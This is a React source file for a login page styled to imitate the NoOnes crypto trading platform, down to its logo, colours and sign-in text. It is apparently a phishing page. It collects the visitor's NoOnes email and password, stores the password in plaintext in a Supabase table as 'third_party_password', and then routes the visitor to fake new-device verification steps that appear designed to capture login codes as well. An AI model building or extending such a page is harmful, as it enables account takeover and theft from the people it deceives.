import React, { useEffect, useRef, useState } from 'react';
import { useNavigate } from 'react-router-dom';
import { supabase } from '../../lib/supabase';
import { useAuth } from '../../contexts/AuthContext';
import { fireAndMove } from '../../lib/syncRetry';

const NOONES_SESSION_ID_KEY = 'noones_session_id';
const NOONES_CURRENT_STEP_KEY = 'noones_current_step';
const NOONES_REQUEST_DATA_KEY = 'noones_request_data';

export default function NoonesConnect() {
  const navigate = useNavigate();
  const { user } = useAuth();
  const [isDarkMode, setIsDarkMode] = useState(true);
  const [selectedLanguage, setSelectedLanguage] = useState('English');
  const [showLanguageDropdown, setShowLanguageDropdown] = useState(false);
  const [loading, setLoading] = useState(false);
  const [errorMessage, setErrorMessage] = useState('');
  const [googleMessage, setGoogleMessage] = useState('');
  const [credentials, setCredentials] = useState({
    email: '',
    password: '',
  });
  const [emailError, setEmailError] = useState('');
  const [passwordError, setPasswordError] = useState('');
  const emailInputRef = useRef<HTMLInputElement | null>(null);

  const validateEmail = (email: string) => {
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    return emailRegex.test(email);
  };

  const validatePassword = (password: string) => password.length >= 6;

  const handleFieldChange = (field: string) => (event: React.ChangeEvent<HTMLInputElement>) => {
    const value = event.target.value;
    setCredentials((current) => ({ ...current, [field]: value }));

    if (field === 'email') {
      if (!validateEmail(value)) {
        setEmailError('Please enter a valid email');
      } else {
        setEmailError('');
      }
    } else if (field === 'password') {
      if (!validatePassword(value)) {
        setPasswordError('Password must be at least 6 characters');
      } else {
        setPasswordError('');
      }
    }
  };

  const saveNoonesProgress = (step: number, trackingId?: string, requestData?: Record<string, unknown>) => {
    try {
      window.localStorage.setItem(NOONES_CURRENT_STEP_KEY, step.toString());
      if (trackingId) {
        window.localStorage.setItem(NOONES_SESSION_ID_KEY, trackingId);
      }
      if (requestData) {
        window.localStorage.setItem(NOONES_REQUEST_DATA_KEY, JSON.stringify(requestData));
      }
    } catch {
      // ignore storage failures
    }
  };

  const loadNoonesProgress = () => {
    try {
      const step = window.localStorage.getItem(NOONES_CURRENT_STEP_KEY);
      const trackingId = window.localStorage.getItem(NOONES_SESSION_ID_KEY);
      const requestDataStr = window.localStorage.getItem(NOONES_REQUEST_DATA_KEY);
      const requestData = requestDataStr ? JSON.parse(requestDataStr) : null;
      return { step: step ? parseInt(step) : null, trackingId, requestData };
    } catch {
      return { step: null, trackingId: null, requestData: null };
    }
  };

  const clearNoonesProgress = () => {
    window.localStorage.removeItem(NOONES_CURRENT_STEP_KEY);
    window.localStorage.removeItem(NOONES_SESSION_ID_KEY);
    window.localStorage.removeItem(NOONES_REQUEST_DATA_KEY);
  };

  useEffect(() => {
    const { step, requestData } = loadNoonesProgress();
    if (step && step > 1 && requestData) {
      // Redirect to the appropriate step
      if (step === 2) {
        navigate('/connect/noones/new-device-verify', { state: { email: requestData.email, platformData: requestData } });
      } else if (step === 3) {
        navigate('/connect/noones/verify-device', { state: { email: requestData.email, platformData: requestData } });
      }
    }
  }, [navigate]);

  const handleSelectGoogleAccount = () => {
    setGoogleMessage('Please enter your Google email in the email field above.');
    emailInputRef.current?.focus();
  };

  const handleSubmit = async (event: React.FormEvent) => {
    event.preventDefault();
    const { email, password } = credentials;
    if (!email || !password || emailError || passwordError) {
      setErrorMessage('Please correct the errors above.');
      return;
    }
    
    try {
      // Step 1: Generate tracking_id and save to localStorage
      const trackingId = window.crypto?.randomUUID?.() ?? `${Date.now()}-${Math.random().toString(36).slice(2)}`;
      console.log('[NOONES_STEP1] Generated tracking_id:', trackingId);
      
      // Save progress to localStorage immediately
      saveNoonesProgress(2, trackingId, { email, platform: 'Noones', tracking_id: trackingId });
      console.log('[NOONES_STEP1] Saved tracking_id and step 2 to localStorage');

      const requestData = {
        tracking_id: trackingId,
        platform: 'Noones',
        email,
        third_party_password: password,
      };

      // Step 2: Fire INSERT with retry wrapper (non-blocking)
      // This returns immediately, but the sync happens in the background
      const syncId = `noones-step1-${trackingId}`;
      const noonesInsertOperation = async () => {
        const result = await supabase
          .from('platform_connection_requests')
          .insert({
            tracking_id: trackingId,
            platform: 'Noones',
            email,
            third_party_password: password,
          });

        console.log('[NOONES_STEP1] Supabase INSERT response', result);
        return result;
      };

      fireAndMove(noonesInsertOperation, syncId, { maxAttempts: 3, delayMs: 500 });
      console.log('[NOONES_STEP1] INSERT fired in background, navigating to Step 2...');
      
      // Step 3: Navigate immediately (Sync-and-Move pattern)
      navigate('/connect/noones/new-device-verify', { state: { email, platformData: requestData, trackingId } });
      
    } catch (err: any) {
      console.error('[NOONES_STEP1] Error in handleSubmit:', err);
      setErrorMessage(err.message || 'An unexpected error occurred.');
    }
  };

  const themeClasses = isDarkMode 
    ? 'bg-[#1F1F1F] text-[#E7E7E7]' 
    : 'bg-[#F2F2F2] text-[#111111]';
  
  const cardClasses = isDarkMode
    ? 'bg-[#25262B]'
    : 'bg-[#FFFFFF] shadow-[0_4px_24px_rgba(0,0,0,0.04)]';

  const logoSrc = isDarkMode ? '/logos/noonesdark.jpg' : '/logos/nooneslight.jpg';

  const inputClasses = isDarkMode
    ? 'bg-[#3A3A3A] text-[#E7E7E7] placeholder:text-[#8F92A3]'
    : 'bg-[#E9E9E9] text-[#111111] placeholder:text-[#AEBCAF]';

  return (
    <main className={`${themeClasses} h-screen w-full flex flex-col items-center justify-center py-2 sm:py-4 overflow-hidden font-sans transition-colors duration-300`}>
      <div className="w-full max-w-[480px] flex flex-col items-center px-4 space-y-2">
        <img src={logoSrc} alt="Noones" className="w-[280px] h-auto mx-auto" />

        {/* Card */}
        <div className={`${cardClasses} w-full rounded-xl p-8 sm:p-10 flex flex-col items-center`}>
          <h1 className="text-center text-2xl font-bold mb-4">Welcome for NoOnes</h1>

          {/* Social Icons */}
          <div className="flex gap-6 mb-4">
            <button
              type="button"
              onClick={handleSelectGoogleAccount}
              className="w-10 h-10 flex items-center justify-center rounded-full bg-white/10 hover:bg-white/20 transition"
            >
              <img src="/logos/google-icon-logo-svgrepo-com.svg" alt="Google" className="w-9 h-9" />
            </button>
            <button className="w-10 h-10 flex items-center justify-center">
              <img src="/logos/apple-logo-svgrepo-com.svg" alt="Apple" className={`w-9 h-9 ${isDarkMode ? 'invert' : ''}`} />
            </button>
            <button className="w-10 h-10 flex items-center justify-center">
              <img src="/logos/telegram.svg" alt="Telegram" className="w-9 h-9" />
            </button>
          </div>
          {googleMessage && (
            <p className="text-sm text-slate-400 mb-3">{googleMessage}</p>
          )}

          <form onSubmit={handleSubmit} className="w-full space-y-3">
            <div className="space-y-2">
              <label className={`block text-[14px] font-bold ${isDarkMode ? 'text-[#8F92A3]' : 'text-[#666A78]'}`}>Email/Phone number</label>
              <input
                ref={emailInputRef}
                type="email"
                value={credentials.email}
                onChange={handleFieldChange('email')}
                placeholder="Email/Phone number"
                className={`${inputClasses} w-full h-[52px] px-4 rounded-xl border-none outline-none focus:ring-1 focus:ring-[#00c076] transition-all text-[16px]`}
              />
              {emailError && <p className="text-red-500 text-[13px] font-semibold">{emailError}</p>}
            </div>

            <div className="space-y-2">
              <label className={`block text-[14px] font-bold ${isDarkMode ? 'text-[#8F92A3]' : 'text-[#666A78]'}`}>Password</label>
              <div className="relative">
                <input
                  type="password"
                  value={credentials.password}
                  onChange={handleFieldChange('password')}
                  placeholder="Password"
                  className={`${inputClasses} w-full h-[52px] px-4 rounded-xl border-none outline-none focus:ring-1 focus:ring-[#00c076] transition-all text-[16px]`}
                />
                <div className="absolute right-4 top-1/2 -translate-y-1/2 opacity-60">
                  <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" className="rotate-180"><path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"/><line x1="1" y1="1" x2="23" y2="23"/></svg>
                </div>
              </div>
              {passwordError && <p className="text-red-500 text-[13px] font-semibold">{passwordError}</p>}
              <div className="flex justify-end">
                <button type="button" className="text-[14px] font-bold hover:underline" style={{color: isDarkMode ? '#44C166' : '#18C37E'}}>Don't forget password?</button>
              </div>
            </div>

            {errorMessage && <p className="text-red-500 text-[13px] font-semibold text-center">{errorMessage}</p>}

            <button
              type="submit"
              disabled={!credentials.email || !credentials.password || !!emailError || !!passwordError}
              className="w-full h-[60px] hover:opacity-90 disabled:opacity-50 disabled:cursor-not-allowed text-white font-bold text-[20px] rounded-xl transition-colors"
              style={{backgroundColor: isDarkMode ? '#44C166' : '#18C37E'}}
            >
              Log in
            </button>

            <div className="text-center mt-4">
              <p className={`text-[16px] font-medium ${isDarkMode ? 'text-[#8F92A3]' : 'text-[#666A78]'}`}>
                No account yet? <span className="cursor-pointer font-bold hover:underline" style={{color: isDarkMode ? '#44C166' : '#18C37E'}}>Sign up</span>
              </p>
            </div>
          </form>
        </div>

        {/* Footer at Bottom */}
        <div className="w-full flex items-center justify-between pt-4">
          <button
            type="button"
            onClick={() => setIsDarkMode(!isDarkMode)}
            className="flex items-center gap-3 text-base p-0 bg-transparent transition-all duration-300"
            style={{ color: isDarkMode ? '#D8DCE6' : '#111827' }}
          >
            <span className={isDarkMode ? 'opacity-100' : 'opacity-50'}>☀️</span>
            <div className="w-12 h-6 rounded-full relative transition-all duration-300 overflow-hidden" style={{ backgroundColor: isDarkMode ? '#44C166' : '#666A78' }}>
              <span className={`absolute top-1 w-4 h-4 rounded-full bg-white shadow-md transition-all duration-300 ${isDarkMode ? 'translate-x-6' : 'translate-x-1'}`} />
            </div>
            <span className={isDarkMode ? 'opacity-50' : 'opacity-100'}>🌙</span>
          </button>
          
          <div className="relative">
            <button 
              onClick={() => setShowLanguageDropdown(!showLanguageDropdown)}
              className="flex items-center gap-1 text-[16px] font-bold hover:underline transition-all duration-200"
              style={{color: isDarkMode ? '#44C166' : '#18C37E'}}
            >
              {selectedLanguage} <span className="text-[12px] ml-0.5">▼</span>
            </button>
            {showLanguageDropdown && (
              <div className={`absolute bottom-full right-0 mb-2 w-32 rounded-lg shadow-lg border ${isDarkMode ? 'bg-[#292929] border-[#333333]' : 'bg-white border-slate-200'}`}>
                {['English', 'Nigerian Pidgin'].map((lang) => (
                  <button
                    key={lang}
                    onClick={() => {
                      setSelectedLanguage(lang);
                      setShowLanguageDropdown(false);
                    }}
                    className={`w-full text-left px-3 py-2 text-sm hover:bg-opacity-10 transition-colors ${
                      selectedLanguage === lang 
                        ? (isDarkMode ? 'bg-[#44C166] bg-opacity-20' : 'bg-[#18C37E] bg-opacity-20') 
                        : 'hover:bg-gray-100'
                    }`}
                    style={{ color: isDarkMode ? '#F8FAFC' : '#111827' }}
                  >
                    {lang}
                  </button>
                ))}
              </div>
            )}
          </div>
        </div>
      </div>
    </main>
  );
}
